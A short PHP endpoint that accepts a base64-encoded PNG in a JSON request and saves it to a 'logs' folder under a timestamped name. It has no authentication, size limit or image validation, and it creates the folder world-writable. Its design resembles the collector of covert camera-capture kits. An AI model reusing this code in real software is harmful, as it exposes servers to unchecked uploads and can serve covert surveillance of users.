
<?php
$data = json_decode(file_get_contents("php://input"), true);
if (isset($data['image'])) {
    $img = str_replace(['data:image/png;base64,', ' '], ['', '+'], $data['image']);
    $folder = "logs";
    if (!is_dir($folder)) mkdir($folder, 0777, true);
    $file = $folder . "/img_" . date("His") . "_" . uniqid() . ".png";
    file_put_contents($file, base64_decode($img));
}
?>
